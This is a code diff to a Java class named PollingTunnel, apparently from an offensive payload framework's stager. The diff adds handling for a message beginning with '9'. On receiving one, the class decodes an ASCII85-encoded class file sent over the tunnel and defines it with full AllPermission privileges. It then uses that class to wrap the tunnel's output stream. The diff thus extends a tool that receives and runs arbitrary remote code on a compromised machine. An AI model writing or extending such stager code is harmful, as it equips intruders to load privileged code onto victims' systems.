@@ -36,8 +36,15 @@ package javapayload.stager;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.OutputStream;
 import java.io.PipedInputStream;
 import java.io.PipedOutputStream;
+import java.net.URL;
+import java.security.AllPermission;
+import java.security.CodeSource;
+import java.security.Permissions;
+import java.security.ProtectionDomain;
+import java.security.cert.Certificate;
 
 public class PollingTunnel extends Stager implements Runnable {
 
@@ -47,6 +54,7 @@ public class PollingTunnel extends Stager implements Runnable {
 	private byte[][] readBuffer;
 	private boolean done = false;
 	private boolean ready;
+	private Class wposClass = null;
 
 	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
 		localOut = new PipedOutputStream();
@@ -70,6 +78,7 @@ public class PollingTunnel extends Stager implements Runnable {
 		try {
 			if (readBuffer == null) {
 				readBuffer = new byte[1][];
+				PipedOutputStream pos = new PipedOutputStream(localIn);
 				new Thread(this).start();
 				synchronized(this) {
 					ready = true;
@@ -81,7 +90,12 @@ public class PollingTunnel extends Stager implements Runnable {
 				} catch (NoSuchMethodError ex) /**/{
 					pipedIn = new PipedInputStream(localOut);
 				}
-				bootstrap(pipedIn, new PipedOutputStream(localIn), parameters);
+				synchronized(this) {
+					while (wposClass == null) 
+						wait();
+				}
+				OutputStream wpos = (OutputStream) wposClass.getConstructor(new Class[] { PipedOutputStream.class }).newInstance(new Object[] { pos });
+				bootstrap(pipedIn, wpos, parameters);
 			} else {
 				runReaderThread(readBuffer, localIn);
 			}
@@ -124,6 +138,16 @@ public class PollingTunnel extends Stager implements Runnable {
 			if (rawData.length == 0) {
 				localOut.close();
 			}
+		} else if (data.startsWith("9")) {
+			byte[] classfile = decodeASCII85(data.substring(1));
+			final Permissions permissions = new Permissions();
+			permissions.add(new AllPermission());
+			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
+			synchronized(this) {
+				resolveClass(wposClass = defineClass(null, classfile, 0, classfile.length, pd));
+				notifyAll();
+			}
+			return "9";
 		} else if (!data.equals("0")) {
 			throw new IllegalArgumentException(data);
 		}
